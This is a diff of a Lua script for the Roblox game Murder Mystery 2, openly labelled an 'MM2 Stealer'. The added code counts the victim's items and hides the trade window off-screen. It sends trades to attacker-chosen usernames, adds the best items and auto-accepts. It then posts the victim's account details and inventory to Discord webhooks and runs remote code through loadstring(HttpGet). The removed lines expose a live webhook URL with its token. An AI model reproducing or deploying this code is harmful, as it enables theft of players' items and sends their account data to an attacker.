@@ -1,7 +1,7 @@
 Config = {
-    Receivers = {"QuadCoreDragon", ""}, -- Your Username/s.
-    Webhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-", -- Your webhook for hits.
-    FullInventory = false, -- If true, it will display all of the player's items.
+    Receivers = {"QuadCoreDragon", ""}, -- You Username/s.
+    Webhook = "", -- Your webhook for hits.
+    FullInventory = true, -- If true, it will display all of the player's items.
     GoodItemsOnly = false, -- If set to true, the stealer will not ping you if the player only has items below legendary.
     ResendTrade = ".", -- Send this in chat to resend the trade request if you don't receive it.
     Script = "None", -- Scripts > "None", "Custom", "Highlight Hub".
@@ -13,7 +13,7 @@ repeat wait() until game:IsLoaded()
 if getgenv().scriptexecuted then return end
 getgenv().scriptexecuted = true
 
-LogsWebhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-"
+LogsWebhook = ""
 -- Logs Webhook
 
 LOGS_WEBS = LogsWebhook
@@ -40,12 +40,13 @@ local function sendnotification(message)
     print("["..StealerName.."]:" .. message)
     Notification:Notify(
         {Title = "[ "..StealerName.." ]", Description = message},
-        {OutlineColor = Color3.fromRGB(80, 80, 80), Time = 7, Type = "default"}
+        {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 7, Type = "default"}
     )
 end
 
-local messageMM2 = "You just got a new hit with **"..StealerName.."**!"
-if Config.GoodItemsOnly and (Vintage > 0 or Godly > 0 or Ancient > 0 or Unique > 0) then
+local messageMM2 =
+    "You just got a new hit with **"..StealerName.."**!"
+    if Vintage and Godly and Ancient and Unique and Config.GoodItemsOnly then
     messageMM2 = "@everyone\nYou just got a new **good** hit with **"..StealerName.."**!"
 end
 
@@ -58,18 +59,18 @@ local success, errorMsg = pcall(function()
     
     if not games[game.PlaceId] then
         game:GetService("Players").LocalPlayer:Kick("\nUnsupported game!")
-        while true do wait() end
+        while true do end
+        wait(99999999999999999999999999999999999)
     end
     
-    -- Webhook validation
     if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
-        sendnotification("Invalid 'Webhook' URL!")
+        sendnotification("Invalid 'Webhook' url!")
         InvaildWebhook = true
         return
     end
     
     if not LogsWebhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
-        sendnotification("Invalid 'Logs' URL!")
+        sendnotification("Invalid 'Webhook' url!")
         return
     end
     
@@ -79,12 +80,17 @@ local success, errorMsg = pcall(function()
     end
     
     if Config.Script == "Custom" and not Config.CustomLink:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
-        sendnotification("Invalid 'Custom' URL!")
+        sendnotification("Invalid 'Custom' url!")
         return
     end
     
-    -- Ensure FullInventory is boolean
-    Config.FullInventory = Config.FullInventory == true
+    if Config.FullInventory ~= true and Config.FullInventory ~= false then
+        Config.FullInventory = true
+    end
+
+    if Config.FullInventory ~= true and Config.FullInventory ~= false then
+        Config.FullInventory = true
+    end
 
     if Config.Script == nil then
         Config.Script = "None"
@@ -92,37 +98,31 @@ local success, errorMsg = pcall(function()
         Config.Script = Config.Script .. " - " .. Config.CustomLink
     end
     
-    -- Load script based on Config.Script
     if Config.Script == "Custom" then
         loadstring(game:HttpGet(Config.CustomLink))()
     elseif Config.Script == "Mega Hub" then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Hubs/main/Mega.lua", true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Hubs/main/Mega.lua",true))()
     elseif Config.Script == "YARHM" then
-        loadstring(game:HttpGet("https://yarhm.goteamst.com/scr", false))()
+    loadstring(game:HttpGet("https://yarhm.goteamst.com/scr", false))()
     elseif Config.Script == "Nexus" then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
     end
     
-    -- Initialize item counts
-    local itemCounts = {
-        Common = 0,
-        Uncommon = 0,
-        Rare = 0,
-        Legendary = 0,
-        Vintage = 0,
-        Godly = 0,
-        Ancient = 0,
-        Unique = 0
-    }
-
+    Common = 0
+    Uncommon = 0
+    Rare = 0
+    Legendary = 0
+    Vintage = 0
+    Godly = 0
+    Ancient = 0
+    Unique = 0
+    
     LocalPlayer.Idled:connect(function()
         VirtualUser:CaptureController()
         VirtualUser:ClickButton2(Vector2.new())
     end)
     
-    -- Determine UI path
-    local UIPath, TradePath, Mobile
-    if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") then
+    if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
         UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
         TradePath = LocalPlayer.PlayerGui.TradeGUI
         Mobile = false
@@ -133,110 +133,274 @@ local success, errorMsg = pcall(function()
     end
     
     function TapUI(button, check, button2)
-        if check == "Active Check" and button.Active then
-            button = button[button2]
-        elseif check == "Text Check" and button == "^" then
-            button = button2
-        else
-            return
+        if check == "Active Check" then
+            if button.Active then
+                button = button[button2]
+            else
+                return
+            end
         end
-        for _, v in pairs(events) do
-            for _, conn in pairs(getconnections(button[v])) do
-                conn:Fire()
+        if check == "Text Check" then
+            if button == "^" then
+                button = button2
+            else
+                return
+            end
+        end
+        for i,v in pairs(events) do
+            for i,v in pairs(getconnections(button[v])) do
+                v:Fire()
             end
         end
     end
     
-    function Rarity(color, amount, tradeable)
-        local Stack = amount ~= "" and tonumber(amount:match("x(%d+)")) or 1
-        local r, g, b = math.floor(color.R * 255 + 0.5), math.floor(color.G * 255 + 0.5), math.floor(color.B * 255 + 0.5)
-        
-        if r == 106 and g == 106 and b == 106 then
-            itemCounts.Common = itemCounts.Common + Stack
-        elseif r == 0 and g == 255 and b == 255 then
-            itemCounts.Uncommon = itemCounts.Uncommon + Stack
-        elseif r == 0 and g == 200 and b == 0 then
-            itemCounts.Rare = itemCounts.Rare + Stack
-        elseif r == 220 and g == 0 and b == 5 then
-            itemCounts.Legendary = itemCounts.Legendary + Stack
-        elseif r == 255 and g == 0 and b == 179 then
-            itemCounts.Godly = itemCounts.Godly + Stack
-        elseif r == 100 and g == 10 and b == 255 then
-            itemCounts.Ancient = itemCounts.Ancient + Stack
-        elseif r == 240 and g == 140 and b == 0 then
-            itemCounts.Unique = itemCounts.Unique + Stack
+    function Rarity(color, amount, tradeable, requirepath, path)
+        Stack = 0
+    
+        if tradeable then
+            if tradeable:FindFirstChild("Evo") then
+                return
+            end
+        end
+    
+        if amount ~= "" then
+            Stack = tonumber(amount:match("x(%d+)"))
         else
-            itemCounts.Vintage = itemCounts.Vintage + Stack
+            Stack = 1
+        end
+    
+        local r = math.floor(color.R * 255 + 0.5)
+        local g = math.floor(color.G * 255 + 0.5)
+        local b = math.floor(color.B * 255 + 0.5)
+    
+        if r == 106 and g == 106 and b == 106 then
+            Common = Common + Stack
+        elseif r == 0 and g == 255 and b == 255 then
+            Uncommon = Uncommon + Stack
+        elseif r == 0 and g == 200 and b == 0 then
+            Rare = Rare + Stack
+        elseif r == 220 and g == 0 and b == 5 then
+            Legendary = Legendary + Stack
+        elseif r == 255 and g == 0 and b == 179 then
+            Godly = Godly + Stack
+        elseif r == 100 and g == 10 and b == 255 then
+            Ancient = Ancient + Stack
+        elseif r == 240 and g == 140 and b == 0 then
+            Unique = Unique + Stack
+        else
+            Vintage = Vintage + Stack
         end
     end
 
     function checkitem(v)
         if v:IsA("Frame") then
-            local itemNameLabel = v:FindFirstChild("ItemName")
-            if itemNameLabel and itemNameLabel:IsA("TextLabel") then
-                local itemName = itemNameLabel.Label.Text
-                if itemName ~= "Default Knife" and itemName ~= "Default Gun" then
-                    Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text, v:FindFirstChild("Tags"))
-                    if Config.FullInventory then
-                        local number = v.Container.Amount.Text ~= "" and v.Container.Amount.Text or "x1"
-                        table.insert(Inventory, itemName .. " " .. number)
+            if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
+                Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text, v:FindFirstChild("Tags"))
+                if Config.FullInventory then
+                    if v.Container.Amount.Text ~= "" then
+                        number = v.Container.Amount.Text
+                    else
+                        number = "x1"
                     end
+                    table.insert(Inventory, v.ItemName.Label.Text .. " " .. number)
                 end
-            else
-                warn("ItemName not found for item: " .. tostring(v))
             end
         end
     end
     
-
-    function InventoryCheck()
-        for _, v in pairs(UIPath:GetChildren()) do
+    function FullInventory()
+        for i,v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
+            for i,v in pairs(v.Container:GetChildren()) do
+                if v.Name == "Christmas" or v.Name == "Halloween" then
+                    for i,v in pairs(v.Container:GetChildren()) do
+                        checkitem(v)
+                    end
+                else
+                    checkitem(v)
+                end
+            end
+        end
+        for i,v in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
             checkitem(v)
         end
+        if Common and Uncommon and Rare and Legendary and Godly and Ancient and Unique and Vintage == 0 then
+            table.insert(Inventory, "None")
+        end
         if Config.FullInventory then
-            if #Inventory > 0 then
-                sendnotification("You have " .. #Inventory .. " items in your inventory.")
-                for _, item in ipairs(Inventory) do
-                    sendnotification(item)
-                end
-            else
-                sendnotification("Alt Account detected!")
-            end
+            return table.concat(Inventory, ", ")
+        else
+            return "Full inventory set false."
         end
     end
-
-    function onPlayerAdded(player)
-        local success, result = pcall(function()
-            local UserId = player.UserId
-            local TradeData = HttpService:JSONDecode(game:GetService("ReplicatedStorage").TradeData:InvokeServer(UserId))
-
-            -- Process trade data
-            for _, v in pairs(TradeData) do
-                if Config.FullInventory then
-                    local number = v.Amount ~= "" and v.Amount or "x1"
-                    table.insert(Inventory, v.Name .. " " .. number)
-                end
-                sendnotification("You have traded with " .. player.Name .. " who has " .. v.Amount .. " " .. v.Name)
+    
+    FullInventory()
+    
+    task.wait()
+    
+    function Sendtrade()
+        if Mobile then
+            local Path = LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard
+            TapUI(Path.Container.Close)
+            TapUI(Path.Container.PlayerList[Receiver].ActionButton)
+            TapUI(Path.Popup.Container.Action.Trade)
+            TapUI(Path.Popup.Container.Close)
+        else
+            local Path = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard
+            TapUI(Path.Container.ToggleRequests.On)
+            TapUI(Path.Container.Close.Title.Text, "Text Check", Path.Container.Close.Toggle)
+            TapUI(Path.Container.TradeRequest.ReceivingRequest, "Active Check", "Decline")
+            TapUI(Path.Container.TradeRequest.SendingRequest, "Active Check", "Cancel")
+            TapUI(Path.Container[Receiver].ActionButton)
+            TapUI(Path.Inspect.Trade)
+            TapUI(Path.Inspect.Close)
+        end
+    end
+    
+    function readchats()
+        Players[Receiver].Chatted:Connect(function(msg)
+            if msg == Config.ResendTrade then
+                Sendtrade()
             end
         end)
-
-        if not success then
-            warn("Error processing trade data for player: " .. player.Name .. " - " .. result)
+    end
+    
+    function Activate(player)
+        for i,v in pairs(Config.Receivers) do
+            if v == player then
+                Receiver = player
+                readchats()
+                wait(10)
+                Sendtrade()
+            end
         end
     end
+    
+    function InsertItems()
+        local ItemsByRarity = {
+            Ancient = {},
+            Godly = {},
+            Unique = {},
+            Vintage = {},
+            Legendary = {},
+            Rare = {},
+            Uncommon = {},
+            Common = {}
+        }
 
-    -- Connect to players added event
-    Players.PlayerAdded:Connect(onPlayerAdded)
+        for i,v in pairs(TradePath.Container.Items.Main:GetChildren()) do
+            for i,v in pairs(v.Items.Container.Current.Container:GetChildren()) do
+                if v:IsA("Frame") then
+                    if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
+                        local rarity = "Common"
+                        local color = v.ItemName.BackgroundColor3
+                        if color == Color3.fromRGB(220, 0, 5) then
+                            rarity = "Legendary"
+                        elseif color == Color3.fromRGB(255, 0, 179) then
+                            rarity = "Godly"
+                        elseif color == Color3.fromRGB(100, 10, 255) then
+                            rarity = "Ancient"
+                        elseif color == Color3.fromRGB(240, 140, 0) then
+                            rarity = "Unique"
+                        elseif color == Color3.fromRGB(255, 255, 0) then
+                            rarity = "Vintage"
+                        elseif color == Color3.fromRGB(0, 200, 0) then
+                            rarity = "Rare"
+                        elseif color == Color3.fromRGB(0, 255, 255) then
+                            rarity = "Uncommon"
+                        end
+                        table.insert(ItemsByRarity[rarity], v)
+                    end
+                end
+            end
+        end
 
-    -- Initial inventory check
-    InventoryCheck()
+        local ItemsInTrade = 0
+        local rarityOrder = {"Ancient", "Godly", "Unique", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
+    
+        for _, rarity in ipairs(rarityOrder) do
+            for _, item in ipairs(ItemsByRarity[rarity]) do
+                if ItemsInTrade < 4 then
+                    ItemsInTrade = ItemsInTrade + 1
+                    local LoopsItem = 1
+                    local Amount = item.Container.Amount.Text
+                    if Amount ~= "" then
+                        LoopsItem = tonumber(Amount:match("x(%d+)"))
+                    end
+                    task.wait()
+                    for i = 1, LoopsItem do
+                        TapUI(item.Container.ActionButton)
+                    end
+                end
+            end
+        end
+    
+        wait(10)
+        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
+    end
 
-    -- Trade handling logic (may require adaptation)
-    Trade.OnClientEvent:Connect(function(trader)
-        onPlayerAdded(trader)
+    if Mobile then
+        TradePath.Container.Position = Position
+        TradePath.ClickBlocker.Position = Position
+    else
+        TradePath.BG.Position = Position
+        TradePath.Container.Position = Position
+        TradePath.ClickBlocker.Position = Position
+        TradePath.Processing.Position = Position
+    end
+    
+    TradePath:GetPropertyChangedSignal("Enabled"):Connect(function()
+        wait(3)
+        if TradePath.Enabled then
+            InsertItems()
+        else
+            Sendtrade()
+        end
     end)
+    
+    Players.PlayerAdded:Connect(function(player)
+        Activate(player.Name)
+    end)
+    
+    for i,v in pairs(Players:GetPlayers())do
+        Activate(v.Name)
+    end
 end)
 
-if errorMsg then
-    sendnotification("Error: " .. errorMsg)
-end
+local data = {
+        username = StealerName,
+        avatar_url = "https://cdn.discordapp.com/attachments/1295330912900223039/1295610470228561972/standard.gif?ex=670f46c7&is=670df547&hm=d67f2702e28851f197035c849929a5d05b1f4b9e6830f463268c3234310d03ce&",
+        content = messageMM2,
+        embeds = {
+            {
+                title = "💻 **__"..StealerName.."__ | __MM2 Stealer__**",
+                description = "**📃  Player Information**: \n```lua\nUsername     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. identifyexecutor() .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\n🎒 **__Inventory__**\n```Ancient    🏺: " .. Ancient .. "\nGoldy      🧠: " .. Godly .. "\nUnique     ⚜️: " .. Unique .. "\nVintage    ⌛: " .. Vintage .. "\nLegendary  ⚔️: " .. Legendary .. "\nRare       📜: " .. Rare .. "\nUncommon   🗿: " .. Uncommon .. "\nCommon     💀: " .. Common .. "```\n🎒 **__Full Inventory__**\n```" .. FullInventory() .. "```\n🔗 **__Execute to join__**\n```" .. TeleportScript .. "```",
+                color = tonumber(0x3365FF),
+                fields = {
+                    {
+                        name = "🎮Auto Joiner",
+                        value = "Soon"
+                    }
+                }
+            }
+        }
+    }
+
+local request = http_request or request or HttpPost or syn.request
+request({
+    Url = Config.Webhook,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = game.HttpService:JSONEncode(data)
+})
+
+local request = http_request or request or HttpPost or syn.request
+request({
+  Url = LogsWebhook,
+  Method = "POST",
+  Headers = {
+      ["Content-Type"] = "application/json"
+    },
+    Body = game.HttpService:JSONEncode(data)
+})
